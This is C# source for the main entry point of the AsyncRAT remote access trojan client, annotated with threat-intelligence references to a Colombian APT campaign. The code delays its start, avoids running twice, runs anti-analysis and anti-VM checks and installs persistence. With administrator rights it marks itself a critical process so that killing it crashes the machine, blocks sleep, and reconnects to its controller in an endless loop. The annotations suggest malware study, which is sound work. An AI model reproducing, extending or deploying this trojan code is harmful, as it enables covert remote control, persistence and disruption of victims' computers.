﻿using System.Threading;
using Client.Connection;
using Client.Install;
using System;
using Client.Helper;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program is distributed for educational purposes only.
*/

namespace Client
{
    public class Program
    /* Program
    *       About:
    *           Main class for the AsyncRAT client
    *       Results:
    *           On startup will look for duplicates and exit if so. Also checks for and will run anti-analysis techniques
    *           and establish persistence if configured. Finally checks to see if the payload is running as a high
    *           integrity process (Administrator) and if so will call RtlSetProcessIsCritical to cause a BSOD if the 
    *           process is killed.
    *       CTI and References:
    *           https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
    *           https://dciber.org/analisando-asyncrat-distribuido-na-colombia/
    *           http://www.pinvoke.net/default.aspx/ntdll/RtlSetProcessIsCritical.html?diff=y
    *
    */
    {
        public static void Main()
        {
            for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
            {
                Thread.Sleep(1000);
            }

            if (!Settings.InitializeSettings()) Environment.Exit(0);

            try
            {
                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                    Environment.Exit(0);

                if (Convert.ToBoolean(Settings.Anti)) //run anti-virtual environment
                    Anti_Analysis.RunAntiAnalysis();

                if (Convert.ToBoolean(Settings.Install)) //drop payload [persistence]
                    NormalStartup.Install();

                if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin()) //active critical process
                    ProcessCritical.Set();

                Methods.PreventSleep(); //prevent pc to idle\sleep

            }
            catch { }

            while (true) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch { }
                Thread.Sleep(5000);
            }
        }
    }
}